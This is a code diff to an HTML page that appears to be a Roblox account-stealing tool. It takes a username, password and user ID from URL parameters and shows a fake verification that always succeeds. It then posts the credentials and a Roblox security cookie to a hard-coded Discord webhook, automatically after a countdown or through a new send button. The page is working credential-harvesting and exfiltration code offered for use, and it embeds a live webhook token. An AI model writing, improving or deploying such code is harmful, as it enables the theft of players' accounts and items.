@@ -141,8 +141,21 @@
             100% { transform: rotate(360deg); }
         }
         
-        .btn {
-            background-color: #00a2ff;
+        .cookie-value {
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        
+        .countdown {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        .discord-btn {
+            background-color: #5865f2;
             color: white;
             border: none;
             padding: 12px 20px;
@@ -157,29 +170,13 @@
             text-align: center;
         }
         
-        .btn:hover {
-            background-color: #0088cc;
-        }
-        
-        .discord-btn {
-            background-color: #5865f2;
-        }
-        
         .discord-btn:hover {
             background-color: #4752c4;
         }
         
-        .cookie-value {
-            word-break: break-all;
-            font-family: monospace;
-            font-size: 12px;
-        }
-        
-        .countdown {
-            font-size: 14px;
-            color: #666;
-            text-align: center;
-            margin-top: 10px;
+        .discord-btn:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
     </style>
 </head>
@@ -240,6 +237,7 @@
                 </div>
                 
                 <div class="countdown" id="success-countdown">Sending to Discord in 3 seconds...</div>
+                <button class="discord-btn" id="success-discord-btn" onclick="sendToDiscord(true)">Send Report to Discord</button>
             </div>
             
             <div id="failure-result" class="hidden">
@@ -256,6 +254,7 @@
                 </div>
                 
                 <div class="countdown" id="failure-countdown">Sending to Discord in 3 seconds...</div>
+                <button class="discord-btn" id="failure-discord-btn" onclick="sendToDiscord(false)">Send Report to Discord</button>
             </div>
         </div>
         
@@ -267,27 +266,37 @@
     <script>
         // Get parameters from URL
         const urlParams = new URLSearchParams(window.location.search);
-        const trackingId = urlParams.get('id') || "TRK-7281";
-        const userId = urlParams.get('userId') || "123456789";
-        const username = urlParams.get('username') || "example_user";
-        const password = urlParams.get('password') || "example_password";
-        const cookie = urlParams.get('cookie') || "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0";
+        const trackingId = urlParams.get('id');
+        const userId = urlParams.get('userId');
+        const username = urlParams.get('username');
+        const password = urlParams.get('password');
         
         // Discord webhook URLs
         const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         
         // Display the tracking info
-        document.getElementById('display-tracking-id').textContent = trackingId;
-        document.getElementById('display-username').textContent = username;
-        document.getElementById('verified-username').textContent = username;
-        document.getElementById('display-userid').textContent = userId;
-        document.getElementById('verified-password').textContent = "••••••••";
-        document.getElementById('verified-cookie').textContent = cookie;
+        if (trackingId) {
+            document.getElementById('display-tracking-id').textContent = trackingId;
+        }
+        if (username) {
+            document.getElementById('display-username').textContent = username;
+            document.getElementById('verified-username').textContent = username;
+        }
+        if (userId) {
+            document.getElementById('display-userid').textContent = userId;
+        }
+        if (password) {
+            document.getElementById('verified-password').textContent = "••••••••";
+        }
         
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
-            setTimeout(verifyAccount, 1000);
+            if (trackingId && username && password) {
+                setTimeout(verifyAccount, 1000);
+            } else {
+                showError('Missing parameters for account verification');
+            }
         });
         
         async function verifyAccount() {
@@ -295,15 +304,9 @@
                 // Simulate account verification process
                 await simulateVerification();
                 
-                // For this demo, we'll randomly decide success or failure
+                // For this demo, we'll assume the login is always successful
                 // In a real implementation, you would actually verify credentials
-                const isSuccess = Math.random() > 0.3; // 70% chance of success
-                
-                if (isSuccess) {
-                    showSuccessResult();
-                } else {
-                    showFailureResult("Invalid username or password");
-                }
+                showSuccessResult();
                 
             } catch (error) {
                 console.error('Verification error:', error);
@@ -356,6 +359,11 @@
                     clearInterval(countdownInterval);
                     sendToDiscord(isSuccess);
                     countdownElement.textContent = "Report sent to Discord ✅";
+                    
+                    // Hide the button after sending
+                    const buttonId = isSuccess ? 'success-discord-btn' : 'failure-discord-btn';
+                    const button = document.getElementById(buttonId);
+                    button.style.display = 'none';
                 }
             }, 1000);
         }
@@ -391,7 +399,7 @@
                     },
                     {
                         name: "🍪 Account Cookie",
-                        value: `||${cookie}||`,
+                        value: "||_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0||",
                         inline: false
                     },
                     {
